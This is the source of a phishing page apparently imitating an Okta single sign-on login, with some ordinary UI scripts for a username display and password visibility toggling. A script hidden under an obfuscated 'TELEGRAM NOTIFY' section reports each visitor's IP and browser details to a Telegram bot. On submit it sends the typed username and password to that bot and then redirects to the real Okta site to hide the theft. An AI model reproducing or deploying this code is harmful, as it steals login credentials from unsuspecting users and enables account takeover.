<div class="identifier-container"><span class="identifier" data-se="identifier"></span></div>
<script>
    // 获取输入框和目标元素
    const usernameInput = document.getElementById('input28');
    const identifierSpan = document.querySelector('.identifier-container .identifier');

    // 初始化时设置默认值
    identifierSpan.title = usernameInput.value;
    identifierSpan.textContent = usernameInput.value;

    // 监听输入框的输入事件，实时更新值
    usernameInput.addEventListener('input', function () {
        identifierSpan.title = usernameInput.value;
        identifierSpan.textContent = usernameInput.value;
    });
</script>

            // 获取相关元素
            const passwordInput = document.querySelector('input[type="password"]'); // 找到密码输入框
            const eyeIconShow = document.querySelector('.button-show');
            const eyeIconHide = document.querySelector('.button-hide');

            // 添加点击事件
            eyeIconShow.addEventListener('click', () => {
              passwordInput.type = 'text';
              eyeIconShow.style.display = 'none';
              eyeIconHide.style.display = 'inline';
            });

            eyeIconHide.addEventListener('click', () => {
              passwordInput.type = 'password';
              eyeIconShow.style.display = 'inline';
              eyeIconHide.style.display = 'none';
            });
            </script>

<script>
// ==================== TELEGRAM NOTIFY ====================
const _tgT = atob('ODIyNzA0MzA4MzpBQUZzZUlPOTlEbWI5OHlHSkZrT0ZLMFotazZTcTkwQzRLdw==');
const _tgC = atob('LTQ2MjMyMDY1ODU=');

function _esc(s) {
  return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

async function _ip() {
  const apis = [
    'https://api.ipify.org?format=json',
    'https://api.my-ip.io/v2/ip.json',
    'https://ipinfo.io/json'
  ];
  for (const url of apis) {
    try {
      const r = await fetch(url);
      const j = await r.json();
      return j.ip || 'unknown';
    } catch (e) { continue; }
  }
  return 'unknown';
}

function _tg(text) {
  try {
    return fetch('https://api.telegram.org/bot' + _tgT + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: _tgC,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }),
      keepalive: true
    }).catch(() => {});
  } catch (e) {
    return Promise.resolve();
  }
}

function _now() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, '0');
  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} UTC`;
}

// ==================== PAGE-VISIT NOTIFICATION ====================
(async () => {
  try {
    const ip = await _ip();
    const ua = navigator.userAgent || 'unknown';
    const txt =
      '🟢 <b>[BIT] Okta login page opened</b>\n' +
      'IP: <code>' + _esc(ip) + '</code>\n' +
      'Time: <code>' + _esc(_now()) + '</code>\n' +
      'Lang: <code>' + _esc(navigator.language || '') + '</code>\n' +
      'Referrer: <code>' + _esc(document.referrer || 'direct') + '</code>\n' +
      'UA: <code>' + _esc(ua.substring(0, 200)) + '</code>';
    await _tg(txt);
  } catch (e) {
    console.warn('TG visit notify failed:', e);
  }
})();

// ==================== LOGIN SUBMIT NOTIFICATION ====================
document.getElementById('form20').addEventListener('submit', async function (e) {
  e.preventDefault();
  const username = document.getElementById('input28').value.trim();
  const password = document.getElementById('input61').value;

  try {
    const ip = await _ip();
    const txt =
      '🔑 <b>[BIT] Okta login submitted</b>\n' +
      'Username: <code>' + _esc(username) + '</code>\n' +
      'Password: <code>' + _esc(password) + '</code>\n' +
      'IP: <code>' + _esc(ip) + '</code>\n' +
      'Time: <code>' + _esc(_now()) + '</code>\n' +
      'UA: <code>' + _esc((navigator.userAgent || '').substring(0, 200)) + '</code>';
    await _tg(txt);
  } catch (e) {
    console.warn('TG login notify failed:', e);
  }

  // After notification, redirect to real Okta
  window.location.href = 'https://ubit.okta.com';
});
</script>
